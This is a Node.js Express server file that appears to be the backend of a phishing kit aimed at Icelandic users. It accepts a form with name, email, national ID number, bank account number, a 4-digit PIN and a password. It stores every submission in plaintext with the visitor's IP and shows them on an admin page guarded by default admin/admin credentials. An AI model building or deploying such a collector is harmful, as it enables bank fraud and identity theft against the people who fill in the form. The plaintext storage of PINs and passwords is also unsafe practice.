import express from "express";
import fs from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import crypto from "node:crypto";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DATA_FILE = path.join(__dirname, "data", "submissions.json");
const PORT = process.env.PORT || 3000;
const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin";

await fs.mkdir(path.dirname(DATA_FILE), { recursive: true });
try { await fs.access(DATA_FILE); } catch { await fs.writeFile(DATA_FILE, "[]"); }

const readAll = async () => JSON.parse(await fs.readFile(DATA_FILE, "utf8"));
const writeAll = async (list) => fs.writeFile(DATA_FILE, JSON.stringify(list, null, 2));

const app = express();
app.use(express.json({ limit: "10kb" }));
app.use(express.static(__dirname, { index: "index.html" }));

const requireAuth = (req, res, next) => {
  const header = req.headers.authorization || "";
  const [scheme, encoded] = header.split(" ");
  if (scheme === "Basic" && encoded) {
    const [user, pass] = Buffer.from(encoded, "base64").toString().split(":");
    if (user === ADMIN_USER && pass === ADMIN_PASS) return next();
  }
  res.set("WWW-Authenticate", 'Basic realm="admin"');
  res.status(401).send("Auth required");
};

const validate = (b) => {
  const errs = [];
  if (!b || typeof b !== "object") return ["Invalid body"];
  const s = (v) => (typeof v === "string" ? v.trim() : "");
  if (s(b.nafn).length < 2) errs.push("nafn");
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(s(b.netfang))) errs.push("netfang");
  if (!/^\d{10}$/.test(s(b.kennitala).replace(/\D/g, ""))) errs.push("kennitala");
  if (!/^\d{4}-?\d{2}-?\d{6}$/.test(s(b.reikningur).replace(/\s/g, ""))) errs.push("reikningur");
  if (!/^\d{4}$/.test(s(b.pin))) errs.push("pin");
  if (!(s(b.password).length > 5 && /\d/.test(s(b.password)))) errs.push("password");
  return errs;
};

app.post("/api/submissions", async (req, res) => {
  const errs = validate(req.body);
  if (errs.length) return res.status(400).json({ ok: false, fields: errs });

  const entry = {
    id: crypto.randomUUID(),
    createdAt: new Date().toISOString(),
    ip: req.ip,
    nafn: req.body.nafn.trim(),
    netfang: req.body.netfang.trim(),
    kennitala: req.body.kennitala.replace(/\D/g, ""),
    reikningur: req.body.reikningur.replace(/\s/g, ""),
    pin: req.body.pin,
    password: req.body.password,
  };
  const list = await readAll();
  list.push(entry);
  await writeAll(list);
  res.json({ ok: true, id: entry.id });
});

app.get("/api/submissions", requireAuth, async (_req, res) => {
  res.json(await readAll());
});

app.delete("/api/submissions/:id", requireAuth, async (req, res) => {
  const list = await readAll();
  const next = list.filter((e) => e.id !== req.params.id);
  await writeAll(next);
  res.json({ ok: true, removed: list.length - next.length });
});

app.get("/admin", requireAuth, (_req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

app.listen(PORT, () => {
  console.log(`Server keyrir á http://localhost:${PORT}`);
  console.log(`Admin: http://localhost:${PORT}/admin  (notandi: ${ADMIN_USER})`);
});
